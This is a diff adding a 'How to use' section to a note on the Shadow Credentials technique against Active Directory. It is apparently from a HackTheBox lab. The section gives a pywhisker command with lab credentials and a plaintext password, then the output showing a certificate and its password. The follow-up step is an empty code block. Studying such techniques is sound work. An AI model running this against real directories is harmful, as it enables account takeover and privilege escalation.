@@ -7,3 +7,16 @@
 - The attacker needs **write control** over the target AD object (or an AD misconfiguration/DACL that allows appending to `msDS-KeyCredentialLink`). This often requires elevated AD permissions or a DACL/ACL weakness on the user/computer object.
 - The environment must accept certificate/PKINIT authentication for the account (many do, especially when Windows Hello for Business or certificate authentication is in use).
 
+
+### How to use:
+```
+pywhisker -d 'puppy.htb' --dc-ip 10.10.11.70 -u 'ant.edwards' -p 'Antman2025!' -k --target 'adam.silver' --action 'add'
+
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: cQ4tqYLC.pfx
+[*] Must be used with password: qkCIOcztu0MWvQuuUbDS
+```
+Now you got certificate, you can use it to get TGT then do what ever you want:
+```
+
+```
